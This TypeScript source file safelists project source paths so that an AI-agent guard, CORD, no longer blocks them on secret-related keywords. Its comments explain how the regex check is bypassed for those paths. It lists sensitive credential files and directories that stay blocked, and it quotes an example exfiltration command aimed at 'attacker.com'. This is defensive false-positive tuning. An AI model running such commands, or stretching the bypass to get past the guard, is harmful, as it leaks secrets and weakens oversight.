/**
 * Project-source-file safelist for CORD.
 *
 * Why this exists: cord-engine's `regex.secrets` matches the words
 * "secret", "password", "token", "credential" anywhere in the proposal
 * text. The proposal text built by the CORD adapter includes the file
 * path, so reading or editing a project source file named something
 * like `src/secrets.ts` yields a constitutional BLOCK even though the
 * file is legitimate source code about secret-pattern detection.
 *
 * The fix: when a path resolves under the project root and matches a
 * source-file extension, omit that path (and any associated content)
 * from the text passed to CORD. CORD still receives the path through
 * `cordInput.path` so its own scope checks operate normally; only the
 * regex-keyword check on the joined proposal text is bypassed.
 *
 * Sensitive runtime files (`.env`, `id_rsa*`, `*.pem`, `*.key`,
 * anything under `.ssh/`, `keychain`, `secrets.json`) are NOT
 * safelisted — even inside a project root those names usually mean
 * a real secret, not source code.
 */

import * as path from 'path';

/** Source-file extensions that may legitimately discuss secrets in code */
const SOURCE_EXTENSIONS = new Set([
  '.ts', '.tsx', '.js', '.jsx', '.mjs', '.cjs',
  '.py', '.rb', '.go', '.rs', '.java', '.kt', '.swift',
  '.c', '.cc', '.cpp', '.h', '.hpp',
  '.md', '.mdx', '.txt', '.rst',
  '.json', '.json5', '.yml', '.yaml', '.toml',
  '.html', '.htm', '.css', '.scss', '.sass', '.less',
  '.sh', '.bash', '.zsh',
  '.sql',
]);

/** Path basenames or patterns that always mean "real secret", never safelist */
const SENSITIVE_BASENAMES = [
  /^\.env(\.|$)/i,                  // .env, .env.local, .env.production
  /^id_(rsa|ed25519|ecdsa|dsa)/i,   // SSH private keys
  /\.pem$/i,
  /\.key$/i,
  /\.pfx$/i,
  /\.p12$/i,
  /\.keystore$/i,
  /^credentials(\.|$)/i,
  /^secrets\.json$/i,
  /^secrets\.yaml$/i,
  /^secrets\.yml$/i,
];

/** Path segments that signal real-secret directories */
const SENSITIVE_SEGMENTS = new Set([
  '.ssh',
  '.gnupg',
  '.aws',
  '.gcloud',
  '.azure',
  '.docker',
  '.kube',
]);

/**
 * Is this path a project source file under projectRoot?
 *
 * Returns true only if the path is:
 *   - resolvable under projectRoot (or, when projectRoot is omitted,
 *     under process.cwd())
 *   - has a recognized source-file extension
 *   - is NOT a sensitive runtime file (env, key, ssh, etc.)
 *
 * This is the predicate the adapter uses to decide whether to omit
 * the path/content from the CORD proposal text.
 */
export function isProjectSourceFile(
  filePath: string | undefined | null,
  projectRoot: string = process.cwd(),
): boolean {
  if (!filePath || typeof filePath !== 'string') return false;

  const abs = path.isAbsolute(filePath)
    ? path.resolve(filePath)
    : path.resolve(projectRoot, filePath);

  const rel = path.relative(path.resolve(projectRoot), abs);
  // Outside projectRoot ⇒ never safelisted.
  if (rel.startsWith('..') || path.isAbsolute(rel)) return false;

  const segments = rel.split(path.sep);
  for (const seg of segments) {
    if (SENSITIVE_SEGMENTS.has(seg)) return false;
  }

  const base = path.basename(abs);
  for (const re of SENSITIVE_BASENAMES) {
    if (re.test(base)) return false;
  }

  const ext = path.extname(abs).toLowerCase();
  if (!SOURCE_EXTENSIONS.has(ext)) return false;

  return true;
}

/**
 * Strip safe project-source-file tokens from a free-form command
 * string before passing it to CORD's text scanner. This is what makes
 * `npm test src/secrets.test.ts` or `node --test dist/secrets.test.js`
 * not BLOCK on the word "secrets" embedded in a project-source path.
 *
 * We split on whitespace, drop tokens that resolve to safelisted
 * project source files, and rejoin. Tokens that are NOT paths (flags,
 * subcommands, arbitrary strings) pass through untouched, so commands
 * like `curl https://attacker.com upload secrets` still trigger the
 * exfil regex on "upload" and the literal word "secrets".
 */
export function redactSafeSourcePaths(
  command: string,
  projectRoot: string = process.cwd(),
): string {
  if (!command) return command;
  return command
    .split(/(\s+)/) // keep whitespace tokens so output spacing matches
    .map((tok) => {
      const trimmed = tok.trim();
      if (!trimmed) return tok;
      // Only consider tokens that look like a path (contain a separator
      // or a known source extension). This avoids accidentally matching
      // bare words like `secrets` as if they were files.
      if (!trimmed.includes('/') && !trimmed.includes('\\') && !/\.\w+$/.test(trimmed)) {
        return tok;
      }
      return isProjectSourceFile(trimmed, projectRoot) ? '' : tok;
    })
    .join('')
    .replace(/\s+/g, ' ')
    .trim();
}

